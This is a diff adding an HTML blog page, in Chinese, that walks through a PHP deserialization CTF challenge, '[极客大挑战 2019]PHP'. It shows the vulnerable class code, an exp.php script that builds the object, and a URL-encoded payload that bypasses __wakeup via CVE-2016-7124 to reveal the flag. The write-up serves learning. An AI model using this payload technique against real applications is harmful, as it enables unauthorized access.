@@ -1,0 +1,228 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>2020903-PHP-PHP反序列化利用 - sakuradied</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="2020903-PHP-PHP反序列化利用已经看了几天的反序列化了,稍微的做一个记录吧
+序列化: 将缓存内容转换为可存储或者可传输的数据(对象持久化)反序列化:将传输内容或存储内容转换为内存数据
+个,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="sakuradied" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">sakuradied</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://sakuradied.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">2020903-PHP-PHP反序列化利用</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">2020903-PHP-PHP反序列化利用</h1>
+        <div class="stuff">
+            <span>九月 04, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="2020903-PHP-PHP反序列化利用"><a href="#2020903-PHP-PHP反序列化利用" class="headerlink" title="2020903-PHP-PHP反序列化利用"></a>2020903-PHP-PHP反序列化利用</h1><p>已经看了几天的反序列化了,稍微的做一个记录吧</p>
+<p>序列化: 将缓存内容转换为可存储或者可传输的数据(对象持久化)<br>反序列化:将传输内容或存储内容转换为内存数据<br><img src="https://i.loli.net/2020/09/03/4BgRyLbFMzKe6wO.png" alt="image.png"></p>
+<p>个人学习使用的环境:[极客大挑战 2019]PHP<br>1,下载网站备份 <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a><br>获得文件<code>ndex.php class.php flag.php index.js style.css</code></p>
+<p>分析像对应的源代码:<br>index.php 重要片段</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="comment">//包涵class.php</span></span><br><span class="line">$select = $_GET[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="comment">//get一个传参</span></span><br><span class="line">$res=unserialize(@$select);</span><br><span class="line"><span class="comment">//unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong><em>class.php</em></strong>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//创建类并进行对象构造</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$username,$password</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//魔术方法:unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//魔术方法:</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    <span class="doctag">Note:</span> 如果子类中定义了构造函数则不会隐式调用其父类的构造函数。要执行父类的构造函数，需要在子类的构造函数中调用 </span></span><br><span class="line"><span class="comment">    parent::__construct()。如果子类没有定义构造函数则会如同一个普通的类方法一样从父类继承（假如没有被定义为 private 的话）。</span></span><br><span class="line"><span class="comment">    https://www.php.net/manual/zh/language.oop5.decon.php#object.destruct</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="comment">//如果password 不等于100 该程序退出 die()同等于exit()</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//username 等于admin 输出flag</span></span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><code>flag.php:无关键信息</code></p>
+<p><strong><em>分析:</em></strong><br>这个只需要满足两个条件即可<br><code>password = 100</code><br><code>username = admin</code></p>
+<p>然后需要绕过__wakeup<br>看上去方法很简单,<br>当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</p>
+<p><strong><em>exp.php:</em></strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span></span><br><span class="line"><span class="class">   //构造<span class="title">Name</span>类</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $username = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">        <span class="comment">//申明私有对象$username </span></span><br><span class="line">        <span class="keyword">private</span> $password = <span class="number">100</span>;</span><br><span class="line">        <span class="comment">//申明私有对象$password</span></span><br><span class="line">&#125;</span><br><span class="line">$user = <span class="keyword">new</span> Name();</span><br><span class="line"><span class="comment">//实体化对象Name()</span></span><br><span class="line">$str = urlencode(serialize($user));</span><br><span class="line"><span class="comment">//序列化并url编码$user</span></span><br><span class="line">var_dump($str);</span><br><span class="line"><span class="comment">//输出变量相关信息</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong><em>payload:</em></strong><br><code>?select=O%3A4%3A&quot;Name&quot;%3A3%3A%7Bs%3A14%3A&quot;%00Name%00username&quot;%3Bs%3A5%3A&quot;admin&quot;%3Bs%3A14%3A&quot;%00Name%00password&quot;%3Bi%3A100%3B%7D</code></p>
+<p>这次仅是一个简单的学习发现自己缺php的内容太多了 ,看看就好</p>
+<p>参考资料:<br>    <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.unserialize.php">https://www.php.net/manual/zh/function.unserialize.php</a><br>    <a target="_blank" rel="noopener" href="https://www.cnblogs.com/chbyl/p/7116591.html">https://www.cnblogs.com/chbyl/p/7116591.html</a><br>public: 公有类型<br>    在子类中可以通过self::var调用public方法或属性,parent::method调用父类方法<br>    在实例中可以能过$obj-&gt;var 来调用　public类型的方法或属性</p>
+<p>protected: 受保护类型<br>    在子类中可以通过self::var调用protected方法或属性,parent::method调用父类方法<br>    在实例中不能通过$obj-&gt;var 来调用  protected类型的方法或属性</p>
+<p>private: 私有类型<br>    该类型的属性或方法只能在该类中使用，在该类的实例、子类中、子类的实例中都不能调用私有类型的属性和方法</p>
+<p>2.self 和　parent 的区别<br>    a).在子类中常用到这两个对像。他们的主要区别在于self可以调用父类中的公有或受保护的属性，但parent不可以调用<br>     b).self:: 它表示当前类的静态成员(方法和属性)　与 $this　不同,$this是指当前对像</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='/i'></li>
+                        
+                    
+                        
+                            <li title='2' data-url='/n'></li>
+                        
+                    
+                        
+                            <li title='3' data-url='/d'></li>
+                        
+                    
+                        
+                            <li title='4' data-url='/e'></li>
+                        
+                    
+                        
+                            <li title='5' data-url='/x'></li>
+                        
+                    
+                        
+                            <li title='6' data-url='/.'></li>
+                        
+                    
+                        
+                            <li title='7' data-url='/m'></li>
+                        
+                    
+                        
+                            <li title='8' data-url='/p'></li>
+                        
+                    
+                        
+                            <li title='9' data-url='/3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
